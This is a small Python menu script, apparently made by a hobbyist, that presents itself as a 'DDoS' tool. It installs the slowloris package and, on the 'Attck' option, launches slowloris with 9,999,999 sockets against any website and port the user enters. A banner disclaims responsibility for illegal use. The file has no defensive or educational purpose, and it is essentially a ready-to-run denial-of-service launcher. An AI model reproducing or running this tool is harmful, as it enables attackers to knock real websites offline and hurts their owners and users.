import os
# Regular Colors
black="\033[0;30m"        # Black
red="\033[0;31m"          # Red
green="\033[0;32m"        # Green
yellow="\033[0;33m"       # Yellow
blue="\033[0;34m"         # Blue
purple="\033[0;35m"       # Purple
cyan="\033[0;36m"         # Cyan
white="\033[0;37m"        # White
os.system('clear')
print(green+'''
-------
|°°°°°|
|°°°°°|>>>>>>>>> [DDoS]
|°°°°°|
-------
''')
print(blue+'======================================================')
print(red+'Note: I wont be responsible fo any illigal activites.')
print(blue+'======================================================')
import os
import sys
import time
def delay_print(s):
    for c in s:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(0.10)
delay_print(green+'%37s' % '   |Devoloped By : Raz Ahamed|\n') 
print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print(blue+'Youtube Chanel: Real tips and Trikes 660')
print(blue+'Telegarm Grop : https://t.me/realtips660')
print(red+'~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~')
print('[1] Update')
print('[2] Attck')
print('[3] Back')
print('')
a=str(input('Selected Option-: '))
if a=='1':
	import os
	print(red+'update...')
	os.system('apt update -y')
	os.system('apt install python -y')
	os.system('pip install slowloris')
	os.system('clear')
	print('Update successfull')
	os.system('python2 start.py')
elif a=='2':
    #slowloris -s 500 -p 80 192.168.1.254
	import os
	print('')
	x=input('Enter Web link -: ')
	z=input('Enter Port-: ')
	i=' '+x
	m=z+i
	print(red+'Type CTRL+c Stop')
	print(green+'Attck Start.......')
	os.system('slowloris -s 9999999 -p '+m)
elif a=='3':
	os.system('exit')
else:
    print(red+'erro!')
    os.system('python2 start.py')